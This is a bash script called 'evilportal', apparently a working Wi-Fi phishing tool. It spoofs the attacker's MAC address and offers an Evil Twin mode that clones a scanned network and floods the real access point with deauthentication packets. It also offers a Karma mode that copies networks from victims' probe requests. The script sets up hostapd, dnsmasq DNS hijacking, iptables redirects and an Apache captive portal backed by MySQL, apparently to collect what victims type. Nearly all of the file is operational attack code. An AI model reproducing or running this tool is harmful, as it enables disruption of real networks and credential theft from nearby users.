#!/bin/bash

tempFolder="/tmp/evilportal"

titulo () {
	echo "
███████╗██╗   ██╗██╗██╗     ██████╗  ██████╗ ██████╗ ████████╗ █████╗ ██╗
██╔════╝██║   ██║██║██║     ██╔══██╗██╔═══██╗██╔══██╗╚══██╔══╝██╔══██╗██║
█████╗  ██║   ██║██║██║     ██████╔╝██║   ██║██████╔╝   ██║   ███████║██║
██╔══╝  ╚██╗ ██╔╝██║██║     ██╔═══╝ ██║   ██║██╔══██╗   ██║   ██╔══██║██║
███████╗ ╚████╔╝ ██║███████╗██║     ╚██████╔╝██║  ██║   ██║   ██║  ██║███████╗
╚══════╝  ╚═══╝  ╚═╝╚══════╝╚═╝      ╚═════╝ ╚═╝  ╚═╝   ╚═╝   ╚═╝  ╚═╝╚══════╝
"
}

selectNetworkInterface(){
	nInterfaces=$(iwconfig 2>/dev/null | grep -oE "wlan[0-9]" | wc -l)
	nMonInterfaces=$(iwconfig 2>/dev/null | grep -o "Monitor" | wc -l)

	if [ $nInterfaces -eq 1 ]
	then
		echo "[-] Configuring network interface..."
		if [ $nMonInterfaces -eq 0 ]
		then
			interface=$(iwconfig 2>/dev/null | grep -oE 'wlan[0-9]')
			ifconfig $interface down
			iwconfig $interface mode monitor
			ifconfig $interface up
			status=$(iwconfig 2>/dev/null | grep -o "Monitor")
			if [ "$status" != "Monitor" ]
			then
				echo "[x] Network interface couldn't be put in monitor mode"
				exit -1
			fi
		else
			interface=$(iwconfig 2>/dev/null | grep -oE 'wlan[0-9]')
		fi
	elif [ $nInterfaces -gt 1 ]
	then
		echo
		echo "Network interfaces:"
		echo
		i=1

		interface[$i]=$(iwconfig 2>/dev/null | grep -oE "wlan[0-9]" | sed -n "$i"p)
		status[$i]=$(iwconfig 2>/dev/null | grep -E "wlan[0-9]" | sed -n "$i"p | grep -o "Monitor")
		while [ ${interface[$i]} ]
		do
			if [ ${status[$i]} ]
			then
				echo "[$i] -> ${interface[$i]} (${status[$i]})"
			else
				echo "[$i] -> ${interface[$i]}"
			fi
			i=$(( $i + 1 ))
			interface[$i]=$(iwconfig 2>/dev/null | grep -oE "wlan[0-9]" | sed -n "$i"p)
			status[$i]=$(iwconfig 2>/dev/null | grep -E "wlan[0-9]" | sed -n "$i"p | grep -o "Monitor")
		done
		echo
		echo -n "Select a network interface > "
		read op
		echo
		echo "[-] Configuring network interface..."
		interface=${interface[$op]}
		status=${status[$op]}
		if [ -z $status ]
		then
			ifconfig $interface down
			iwconfig $interface mode monitor
			ifconfig $interface up
			status=$(iwconfig 2>/dev/null | grep $interface | grep -o "Monitor")
			if [ "$status" != "Monitor" ]
			then
				echo "[x] Network interface couldn't be put in monitor mode"
				exit -1
			fi
		fi
	else
		echo "[x] No network interface found"
		echo
		exit -1
	fi

	echo "[-] Upgrading network interface..."
	ifconfig $interface down
	iw reg set US
	echo "[+] Network interface upgraded"

	echo "[-] Changing MAC address..."
	macchanger -A $interface >/dev/null
	ifconfig $interface up
	echo "[+] MAC address changed"

	echo "[+] Network interface succesfully configured"
	echo
}

# It accept as a param the first network interface
selectNetworkInterface2() {
	nInterfaces=$(iwconfig 2>/dev/null | grep -oE "wlan[0-9]" | wc -l)
	nMonInterfaces=$(iwconfig 2>/dev/null | grep -o "Monitor" | wc -l)

	if [ $nInterfaces -eq 2 ]
	then
		echo "[-] Configuring network interface..."
		if [ $nMonInterfaces -eq 1 ]
		then
			monInterface=$(iwconfig 2>/dev/null | grep "Monitor" | grep -oE "wlan[0-9]" )
			interface2=$(iwconfig 2>/dev/null | grep -oE "wlan[0-9]" | sed -n 1p)
			if [ "$interface2" == "$monInterface" ]
			then
				interface2=$(iwconfig 2>/dev/null | grep -oE "wlan[0-9]" | sed -n 2p)
			fi

			ifconfig $interface2 down
			iwconfig $interface2 mode monitor
			ifconfig $interface2 up
			status=$(iwconfig 2>/dev/null | grep $interface2 | grep -o "Monitor")
			if [ "$status" != "Monitor" ]
			then
				echo "[x] Network interface couldn't be put in monitor mode"
				exit -1
			fi
		else
			interface2=$(iwconfig 2>/dev/null | grep -oE "wlan[0-9]" | sed -n 1p)
			if [ "$1" == "$interface2" ]
			then
				interface2=$(iwconfig 2>/dev/null | grep -oE "wlan[0-9]" | sed -n 2p)
			fi
		fi
	elif [ $nInterfaces -ge 3 ]
	then
		echo
		echo "Network interfaces:"
		echo
		i=1

		interface[$i]=$(iwconfig 2>/dev/null | grep -oE "wlan[0-9]" | sed -n "$i"p)
		status[$i]=$(iwconfig 2>/dev/null | grep -E "wlan[0-9]" | sed -n "$i"p | grep -o "Monitor")
		while [ ${interface[$i]} ]
		do
			if [ ${status[$i]} ]
			then
				echo "[$i] -> ${interface[$i]} (${status[$i]})"
			else
				echo "[$i] -> ${interface[$i]}"
			fi
			i=$(( $i + 1 ))
			interface[$i]=$(iwconfig 2>/dev/null | grep -oE "wlan[0-9]" | sed -n "$i"p)
			status[$i]=$(iwconfig 2>/dev/null | grep -E "wlan[0-9]" | sed -n "$i"p | grep -o "Monitor")
		done
		echo
		echo -n "Select a network interface > "
		read op
		echo
		echo "[-] Configuring network interface..."
		interface2=${interface[$op]}
		status=${status[$op]}
		if [ -z $status ]
		then
			ifconfig $interface2 down
			iwconfig $interface2 mode monitor
			ifconfig $interface2 up
			status=$(iwconfig 2>/dev/null | grep $interface2 | grep -o "Monitor")
			if [ "$status" != "Monitor" ]
			then
				echo "[x] Network interface couldn't be put in monitor mode"
				exit -1
			fi
		fi
	else
		echo "[x] Not enough network interfaces found (2)"
		echo
		exit -1
	fi

	echo "[-] Upgrading network interface..."
	ifconfig $interface2 down
	iw reg set US
	echo "[+] Network interface upgraded"

	echo "[-] Changing MAC address..."
	macchanger -A $interface2 >/dev/null
	ifconfig $interface2 up
	echo "[+] MAC address changed"

	echo "[+] Network interface succesfully configured"
	echo
}

selectNetwork() {
	network=0
	while [ $network -eq 0 ]
	do
		read -p "Seconds to scann for networks [default is 10]> " t

		rm $tempFolder/temporal* 2>/dev/null

	        airodump-ng -w $tempFolder/temporal --output-format netxml $interface>/dev/null &

		if [ -z $t ]
		then
	        	t=10
		fi

		echo
		echo "[-] Scanning for networks ($t seconds)..."
		echo
	        sleep $t
	        pkill airodump-ng

	        num=$(grep "<wireless-network"  $tempFolder/temporal-01.kismet.netxml | wc -l)
		begLines=$(grep -n "<wireless-network" $tempFolder/temporal-01.kismet.netxml | cut -d ":" -f 1)
		endLines=$(grep -n "</wireless-network>" $tempFolder/temporal-01.kismet.netxml | cut -d ":" -f 1)

		i=1
		apNum=1
		while [ $i -le $num ]
		do
			beg=$(echo $begLines | cut -d " " -f $i)
			end=$(echo $endLines | cut -d " " -f $i)
			isAP=$(grep "<wireless-network" $tempFolder/temporal-01.kismet.netxml | cut -d "=" -f 3 | cut -d "\"" -f 2 | sed -n "$i"p)
			if [ "$isAP" == "infrastructure" ]
			then
				tusers[$apNum]=$(sed -n "$beg","$end"p $tempFolder/temporal-01.kismet.netxml | grep "</wireless-client>" | wc -l)
				tbssid[$apNum]=$(sed -n "$beg","$end"p $tempFolder/temporal-01.kismet.netxml | grep BSSID | cut -d ">" -f 2 | cut -d "<" -f 1)
				tessid[$apNum]=$(sed -n "$beg","$end"p $tempFolder/temporal-01.kismet.netxml | grep essid | cut -d ">" -f 2 | cut -d "<" -f 1)
				tchannel[$apNum]=$(sed -n "$beg","$end"p $tempFolder/temporal-01.kismet.netxml | grep channel -m 1 | cut -d ">" -f 2 | cut -d "<" -f 1)
				tencr[$apNum]=$(sed -n "$beg","$end"p $tempFolder/temporal-01.kismet.netxml | grep encryption -m 1 | cut -d ">" -f 2 | cut -d "<" -f 1)
				if [ -z "${tessid[$apNum]}" ]
				then
					tessid[$apNum]="Unknown"
				fi
				if [ $(echo "${tencr[$apNum]}" | grep "WPA") ]
				then
					tencr[$apNum]="WPA"
				elif [ $(echo "${tencr[$apNum]}" | grep "None") ]
				then
					tencr[$apNum]="OPN"
				else
					tencr[$apNum]="---"
				fi
				apNum=$(( $apNum + 1 ))
			fi
			i=$(( $i + 1 ))
		done
		echo "WIFI NETWORKS"
		echo "Network interface: $interface"
		echo "+-----+-------------------+-------+-------+-------+----------------------------------+"
		echo "|  i  |       BSSID       |ENCRYPT|CHANNEL|CLIENTS|     ESSID                        |"
		echo "+-----+-------------------+-------+-------+-------+----------------------------------+"
		i=1
		while [ $i -lt $apNum ]
		do
		    	printf  '%1s %3s %1s %-17s %-2s %3s %2s %3s %3s %3s %3s %-32.32s %1s\n'  "|" "$i" "|" "${tbssid[$i]}" "|" "${tencr[$i]}" "|" "${tchannel[$i]}" "|" "${tusers[$i]}" "|" "${tessid[$i]}" "|"
		    	i=$(( $i + 1 ))
		done
		echo "+-----+-------------------+-------+-------+-------+----------------------------------+"
		echo
		read -p "Select a network [0 to repeat scann]> " network
	done

        bssid=${tbssid[$network]}
        essid=${tessid[$network]}
        channel=${tchannel[$network]}
        encr=${tencr[$network]}

}

sniffProbeRequests() {
	trap "stop=1; pkill tcpdump" SIGINT

	tcpdump -l -e -i $interface type mgt subtype probe-req>$tempFolder/tcpdump.log 2>/dev/null &

	echo
	echo "PROBE REQUESTS [^C to stop]"
	stop=0
	requests=0
	numProbes=1
	while [ $stop -ne 1 ]
	do
		num=$(wc -l $tempFolder/tcpdump.log | cut -d " " -f 1)
		while [ $requests -lt $num ]
		do
			requests=$(( $requests + 1 ))

			clientProv=$(grep -oE "([0-9a-f]{2}:){5}[0-9a-f]{2}" $tempFolder/tcpdump.log | sed -n "$requests"p)
			apProv=$(cut -d "(" -f 3 $tempFolder/tcpdump.log | cut -d ")" -f 1 | sed -n "$requests"p)

			if [ $apProv ]
			then
				i=1
				found=0
				while [ $i -lt $numProbes ]
				do
					if [ "$apProv" == "${ap[$i]}" ]
					then
						found=1
					fi
					i=$(( $i + 1))
				done

				if [ $found -eq 0 ]
				then
					client[$numProbes]=$clientProv
					ap[$numProbes]=$apProv

					echo "[$numProbes] ${client[$numProbes]} -> ${ap[$numProbes]}"

					numProbes=$(( $numProbes + 1 ))
				fi
			fi
		done
		sleep 1
	done

	#Restore SIGINT
	trap exit SIGINT

	echo
	read -p "Select probe request > " op

	essid=${ap[$op]}
}

selectEncryption(){
	op=-1
	echo "Security: "
	while [ $op -lt 0 ] || [ $op -gt 2 ]
	do
		echo "[1] -> Open"
		echo "[2] -> WPA2"
		read -p "> " op
		echo
		if [ $op -lt 1 ] || [ $op -gt 2 ]
		then
			echo "Please, select a valid option: "
		fi
		if [ $op -eq 1 ]
		then
			encr="OPN"
		else
			encr="WPA"
		fi
	done
}

deauth(){
	iwconfig "$3" channel "$2"
        echo
        echo "Press enter to deauth"
        read ola
        aireplay-ng -0 0 -a "$1" "$3"
}

titulo

if [ $EUID -ne 0 ]
then
	echo "[x] Please, run script as root"
	echo
	exit -1
fi

################################ PROGRAMS NEEDED ####################################

echo "[-] Updating packages..."
echo
apt-get install -y hostapd dnsmasq aircrack-ng macchanger mariadb-server screen apache2 php7.3 libapache2-mod-php7.3 php7.3-mysql tcpdump
rm -r $tempFolder 2>/dev/null
mkdir $tempFolder 2>/dev/null
echo
echo "[+] All packages updated"

selectNetworkInterface

######################### IPTABLES FLUSH TO AVOID CONFLICTS ##########################

echo "[-] Flushing iptables..."
iptables -F
iptables -t nat -F
echo "[+] Iptables flushed"

################################# HOSTAPD CONFIG #####################################

op=-1
while [ $op -lt 1 ] || [ $op -gt 3 ]
do
        echo
	echo "Mode:"
        echo "[1] -> Create new acces point"
        echo "[2] -> [Evil Twin] Intercept existing access point"
        echo "[3] -> [Karma] Create acces point recogniced by victim"
	read -p "> " op
	echo

	case $op in
		1)
			deauth=0
	                read -p "Wifi essid > " essid
	                read -p "Channel > " channel
			echo
			selectEncryption
			;;
		2)
			deauth=1
			selectNetworkInterface2 $interface
			selectNetwork
			;;
		3)
			deauth=0
			sniffProbeRequests
			read -p "Channel > " channel
			echo
			selectEncryption
			# random bssid
			bssid=00:09:5a:c9:01:b2
			;;
		*)
			echo "[x] Please, select a valid option: "
			;;
	esac
done

if [ "$encr" = "OPN" ]
then

	echo "interface=$interface
driver=nl80211
ssid=$essid
hw_mode=g
channel=$channel
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0" > $tempFolder/hostapd.conf

else

	read -p "Wifi password [more than 8 chars]> " pass
	echo

	echo "interface=$interface
driver=nl80211
ssid=$essid
hw_mode=g
wpa=2
wpa_passphrase=$pass
wpa_key_mgmt=WPA-PSK
wpa_pairwise=TKIP
rsn_pairwise=CCMP
channel=$channel
macaddr_acl=0
auth_algs=3
ignore_broadcast_ssid=0" > $tempFolder/hostapd.conf

fi

gnome-terminal --geometry 117x24+0+0 -e "bash -c \"clear; hostapd $tempFolder/hostapd.conf; exec bash\"" -q -t "$essid $channel $encr" 2>/dev/null

########################## DNSMASQ CONFIG (DNS & DHCP) ###############################

#Stops dnsmasq daemon on port 53
service dnsmasq stop

# Checks for Internet connection
conex=$(ping -c 3 google.com | grep -oiwE '[100-0]\%' | grep -oiwE '[100-0]')

if [ $conex -lt 100 ]
then

	echo "interface=$interface
dhcp-range=10.0.0.10,10.0.0.250,255.255.255.0,12h
dhcp-option=3,10.0.0.1
dhcp-option=6,10.0.0.1
server=8.8.8.8
log-queries
listen-address=127.0.0.1" > $tempFolder/dnsmasq.conf

	# IPTABLES CONFIG IF THE MACHINE HAS CONNECTION

	# We redirect to 10.0.0.1:80 everything going to port 80 of this machine
	iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination 10.0.0.1:80

	# Everything going out this machine goes by eth0 and masqued
	iptables -t nat -A POSTROUTING --out-interface eth0 -j MASQUERADE

	else

	echo "interface=$interface
dhcp-range=10.0.0.10,10.0.0.250,255.255.255.0,12h
dhcp-option=3,10.0.0.1
dhcp-option=6,10.0.0.1
server=8.8.8.8
log-queries
listen-address=127.0.0.1
address=/#/10.0.0.1" > $tempFolder/dnsmasq.conf

fi

# Configures dnsmasq to assign the interface ip with the domain name so mod_rewrite
# (.htaccess) can reffer directly to the domain name in the URL
echo "10.0.0.1 wifiportal2.aire.es" > $tempFolder/hosts

ifconfig $interface 10.0.0.1

gnome-terminal --geometry 117x25+0+600 -e "bash -c \"clear; dnsmasq -C $tempFolder/dnsmasq.conf -H $tempFolder/hosts -d; exec bash\"" -q -t "DHCP" 2>/dev/null

################################### WEB FILES #########################################

rm -r /var/www/html/* 2>/dev/null
cp -r captive /var/www/html/captive
cp .htaccess /var/www/html
chmod 777 /var/www/html/.htaccess
chmod 777 /var/www/html/captive
chmod 777 /var/www/html/captive/*

cp -f override.conf /etc/apache2/conf-available/

# Enables rewrite and override for .htaccess and php
a2enconf override
a2enmod rewrite
a2enmod php7.3

service apache2 reload
service apache2 restart
service mysql start

if [ $deauth -eq 1 ]
then
	export -f deauth
	export -f selectNetworkInterface2
	export $bssid
	export $channel
	export $interface2
	gnome-terminal --geometry 117x25+1000+600 -e "bash -c \"deauth \"$bssid\" \"$channel\" \"$interface2\"; exec bash\"" -q -t "Deauth $essid ($bssid) channel $channel" 2>/dev/null
	export -f titulo
	gnome-terminal --geometry 117x25+1000+0 -e "bash -c \"titulo; mysql; exec bash\"" -q -t "Database" 2>/dev/null
else
	export -f titulo
	gnome-terminal --geometry 117x50+1000+0 -e "bash -c \"titulo; mysql; exec bash\"" -q -t "Database" 2>/dev/null
fi

rm -r $tempFolder 2>/dev/null
echo
